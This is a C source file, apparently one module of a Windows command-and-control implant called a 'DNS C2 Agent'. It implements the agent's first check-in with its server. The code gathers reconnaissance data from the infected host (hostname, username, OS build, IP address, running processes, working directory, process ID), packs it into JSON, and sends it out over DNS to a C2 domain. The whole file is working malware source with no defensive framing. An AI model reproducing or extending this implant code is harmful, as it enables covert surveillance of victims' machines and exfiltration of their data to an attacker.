/**
 * Checkin.c - Initial check-in for DNS C2 Agent
 * 
 * Handles the initial registration of the agent with the C2 server,
 * collecting and sending system information.
 */

 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <iphlpapi.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <tlhelp32.h>
 #include "../include/Checkin.h"
 #include "../include/Config.h"
 #include "../include/Transport.h"
 #include "../include/Utils.h"
 
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
 
 /**
  * Get the Windows version
  */
 static char* get_windows_version() {
     char* version = (char*)malloc(256);
     if (version == NULL) {
         return NULL;
     }
     
     OSVERSIONINFOEXA osvi;
     ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
     osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
     
     // Note: GetVersionEx is deprecated, but still works for basic info
     // In a real implementation, you'd use RtlGetVersion or other methods
     #pragma warning(disable:4996)
     if (!GetVersionExA((OSVERSIONINFOA*)&osvi)) {
         free(version);
         return NULL;
     }
     #pragma warning(default:4996)
     
     sprintf_s(version, 256, "Windows %d.%d (Build %d)",
              osvi.dwMajorVersion,
              osvi.dwMinorVersion,
              osvi.dwBuildNumber);
     
     return version;
 }
 
 /**
  * Get the primary IP address using a simpler approach
  */
 static char* get_primary_ip() {
     char* ip = (char*)malloc(16);  // IPv4 address (max 15 chars + null)
     if (ip == NULL) {
         return NULL;
     }
     
     // Initialize Winsock
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         strcpy_s(ip, 16, "Unknown");
         return ip;
     }
     
     char hostname[256];
     if (gethostname(hostname, sizeof(hostname)) != 0) {
         WSACleanup();
         strcpy_s(ip, 16, "Unknown");
         return ip;
     }
     
     struct hostent* host = gethostbyname(hostname);
     if (host == NULL) {
         WSACleanup();
         strcpy_s(ip, 16, "Unknown");
         return ip;
     }
     
     struct in_addr addr;
     memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));
     char* addr_str = inet_ntoa(addr);
     
     if (addr_str) {
         strcpy_s(ip, 16, addr_str);
     } else {
         strcpy_s(ip, 16, "Unknown");
     }
     
     WSACleanup();
     return ip;
 }
 
 /**
  * Get the process list
  */
 static char* get_process_list() {
     char* process_list = (char*)malloc(4096);  // Allocate a large buffer
     if (process_list == NULL) {
         return NULL;
     }
     
     process_list[0] = '\0';
     size_t offset = 0;
     
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) {
         strcpy_s(process_list, 4096, "Error getting process list");
         return process_list;
     }
     
     PROCESSENTRY32 pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32);
     
     if (!Process32First(snapshot, &pe32)) {
         CloseHandle(snapshot);
         strcpy_s(process_list, 4096, "Error getting first process");
         return process_list;
     }
     
     // Get the first 10 processes (to keep the list manageable)
     int count = 0;
     do {
         int written = sprintf_s(process_list + offset, 4096 - offset, 
                               "%s,", pe32.szExeFile);
         if (written < 0) {
             break;  // Error or buffer full
         }
         offset += written;
         count++;
     } while (count < 10 && Process32Next(snapshot, &pe32) && offset < 4000);
     
     // Remove the trailing comma
     if (offset > 0 && process_list[offset - 1] == ',') {
         process_list[offset - 1] = '\0';
     }
     
     CloseHandle(snapshot);
     return process_list;
 }
 
 /**
  * Get system information for check-in
  */
 char* get_system_info() {
     // Get various system information
     char* hostname = get_hostname();
     char* username = get_username();
     char* windows_version = get_windows_version();
     char* primary_ip = get_primary_ip();
     char* process_list = get_process_list();
     char* current_dir = get_current_directory();
     
     // Allocate buffer for the combined information
     char* system_info = (char*)malloc(8192);
     if (system_info == NULL) {
         if (hostname) free(hostname);
         if (username) free(username);
         if (windows_version) free(windows_version);
         if (primary_ip) free(primary_ip);
         if (process_list) free(process_list);
         if (current_dir) free(current_dir);
         return NULL;
     }
     
     // Format the system information as JSON
     sprintf_s(system_info, 8192, 
              "{"
              "\"hostname\":\"%s\","
              "\"username\":\"%s\","
              "\"os\":\"%s\","
              "\"ip\":\"%s\","
              "\"processes\":\"%s\","
              "\"directory\":\"%s\","
              "\"pid\":%d,"
              "\"arch\":\"x64\""
              "}",
              hostname ? hostname : "Unknown",
              username ? username : "Unknown",
              windows_version ? windows_version : "Unknown",
              primary_ip ? primary_ip : "Unknown",
              process_list ? process_list : "Unknown",
              current_dir ? current_dir : "Unknown",
              GetCurrentProcessId());
     
     // Free allocated memory
     if (hostname) free(hostname);
     if (username) free(username);
     if (windows_version) free(windows_version);
     if (primary_ip) free(primary_ip);
     if (process_list) free(process_list);
     if (current_dir) free(current_dir);
     
     return system_info;
 }
 
 /**
  * Perform initial check-in with the C2 server
  */
 BOOL perform_checkin() {
     // Get system information
     char* system_info = get_system_info();
     if (system_info == NULL) {
         return FALSE;
     }
     
     // Get agent ID (either from config or generate a new one)
     const char* agent_id = get_agent_id();
     
     // Get C2 domain
     const char* domain = get_c2_domain();
     
     // Generate a result ID for the check-in
     char result_id[9];
     sprintf_s(result_id, sizeof(result_id), "checkin");
     
     // Send the system information to the C2 server
     BOOL success = dns_send_result(agent_id, result_id, system_info, domain);
     
     free(system_info);
     return success;
 }
 